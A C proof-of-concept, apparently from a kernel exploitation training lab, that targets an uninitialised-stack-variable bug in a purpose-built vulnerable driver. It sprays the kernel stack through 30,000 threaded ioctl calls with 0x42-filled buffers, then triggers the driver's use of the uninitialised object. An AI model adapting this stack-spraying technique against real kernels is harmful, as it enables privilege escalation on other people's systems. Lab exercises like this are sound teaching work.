#define _GNU_SOURCE  
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>

#include "../src/vuln_driver.h"

#define NUM_THREADS 30000
int fd;

typedef struct stack_obj 
{
	int do_callback;
	long fn_arg;
	void (*fn)(long) ;
}stack_obj;

typedef struct use_obj_args
{
	int option;
	long fn_arg;
}use_obj_args;

void *do_ioctl(void *arg)
{
	char *buff = (char *)arg;
	
	ioctl(fd, UNINITIALISED_STACK_ALLOC, buff);
}

void stack_spray(char *buff)
{
	pthread_t threads[NUM_THREADS];

	for(int i = 0; i < NUM_THREADS; i++)
	{
		pthread_create(&threads[i], NULL, &do_ioctl, (void *)buff);
	}

	for(int i = 0; i < NUM_THREADS; i++)
	{
		pthread_join(threads[i], NULL);
	}
	
}

int main(void)
{
	fd = open("/dev/vulnerable_device", O_RDWR);

	use_obj_args use_obj = {
		.option = 1,
		.fn_arg = 1337,
	};

	
	char buff[4096];
	memset(buff, 0x42, sizeof(buff));

	stack_spray(buff);

	
	ioctl(fd, UNINITIALISED_STACK_ALLOC, buff);
	

	ioctl(fd, UNINITIALISED_STACK_USE, &use_obj);
	
	close(fd);

}
